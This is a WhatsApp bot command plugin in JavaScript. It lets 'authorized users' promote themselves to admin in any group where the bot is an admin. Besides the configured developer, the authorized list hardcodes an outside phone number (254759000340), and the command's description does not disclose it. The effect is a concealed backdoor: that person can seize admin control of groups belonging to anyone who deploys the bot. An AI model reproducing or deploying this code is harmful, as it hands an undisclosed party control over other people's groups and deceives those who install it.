const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["grantadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    try {
        // ♻️ Loading reaction
        await conn.sendMessage(from, {
            react: { text: "♻️", key: mek.key }
        });

        // Verify group context
        if (!isGroup) return reply("*🔴 This command can only be used in groups.*");

        // Verify bot is admin
        if (!isBotAdmins) return reply("*🔴 I need to be an admin to perform this action.*");

        // Normalize JIDs for comparison
        const normalizeJid = (jid) => {
            if (!jid) return jid;
            return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
        };

        // Authorized users
        const AUTHORIZED_USERS = [
            normalizeJid(config.DEV),
            "254759000340@s.whatsapp.net"
        ].filter(Boolean);

        const senderNormalized = normalizeJid(sender);
        if (!AUTHORIZED_USERS.includes(senderNormalized)) {
            return reply("*🔴 This command is restricted to authorized users only*");
        }

        // Get current group metadata
        const groupMetadata = await conn.groupMetadata(from);

        // Check if already admin
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) return reply("*ℹ️ You're already an admin in this group.*");

        // Promote self to admin
        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");

        // ✅ Success reaction
        await conn.sendMessage(from, {
            react: { text: "✅", key: mek.key }
        });

        // Reply with mention
        return reply(`*✔️ Successfully granted admin rights to @${senderNormalized.split('@')[0]}!*`, {
            mentions: [senderNormalized]
        });

    } catch (error) {
        console.error("Admin command error:", error);

        // ❌ Error reaction
        await conn.sendMessage(from, {
            react: { text: "❌", key: mek.key }
        });

        return reply(`*🔴 Failed to grant admin rights. Error:* ${error.message}`);
    }
});